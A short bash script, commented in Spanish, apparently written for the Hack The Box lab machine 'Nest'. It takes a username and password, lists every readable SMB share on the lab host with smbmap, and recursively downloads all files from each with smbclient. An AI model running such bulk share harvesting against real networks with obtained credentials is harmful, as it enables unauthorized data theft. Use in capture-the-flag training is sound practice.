#!/bin/bash
# Script usado para nest, permite descargar todos los archivos de todos los directorios compartidos
# Requiere smbmap y smbclient
# https://github.com/juliourena/plaintext/blob/master/hackthebox/smbgetall.sh

username=$1
password=$2

mkdir $username 
cd $username

for share in $(smbmap -u "$username" -p "$password" -H 10.10.10.178 | grep -i READ | cut -d$'\t' -f2)
do
	mkdir $share
	cd $share
	smbclient -U $username%$password //10.10.10.178/$share -c 'prompt OFF; recurse ON;mget *'
	cd ..
done
